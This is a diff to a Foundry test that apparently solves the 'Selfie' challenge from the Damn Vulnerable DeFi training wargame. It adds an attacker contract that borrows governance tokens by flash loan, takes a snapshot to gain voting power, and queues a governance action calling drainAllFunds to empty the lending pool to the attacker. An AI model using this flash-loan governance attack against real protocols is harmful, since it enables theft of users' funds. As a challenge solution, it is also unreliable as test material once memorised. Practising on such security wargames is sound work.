@@ -48,6 +48,14 @@ contract Selfie is Test {
          * EXPLOIT START *
          */
 
+        AttackerContract attackerContract = new AttackerContract(simpleGovernance, selfiePool, address(attacker));
+
+        attackerContract.attack(TOKENS_IN_POOL);
+
+        vm.warp(block.timestamp + 2.1 days);
+
+        simpleGovernance.executeAction(1);
+
         /**
          * EXPLOIT END *
          */
@@ -60,4 +68,46 @@ contract Selfie is Test {
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
     }
+}
+
+
+
+
+contract AttackerContract {
+
+    bool exploit = false;
+
+    SimpleGovernance immutable governor;
+    SelfiePool immutable lender;
+
+    address immutable attacker;
+
+    constructor (SimpleGovernance _governor, SelfiePool _lender, address _attacker) {
+        lender = _lender;
+        governor = _governor;
+        attacker = _attacker;
+    }
+
+    /**
+        @param amount flashloan to request
+     */
+    function attack(uint256 amount) external {
+        lender.flashLoan(amount);
+    }
+
+    /**
+        call back function for flashloan receiver this function is called when ever a user takes a flashLoan
+     */
+    function receiveTokens(address token, uint256 amount) external {
+
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
+
+        DamnValuableTokenSnapshot(token).snapshot();
+
+        DamnValuableTokenSnapshot(token).transfer(address(lender), amount);
+
+        governor.queueAction(address(lender), data, 0);
+
+    }
+
 }
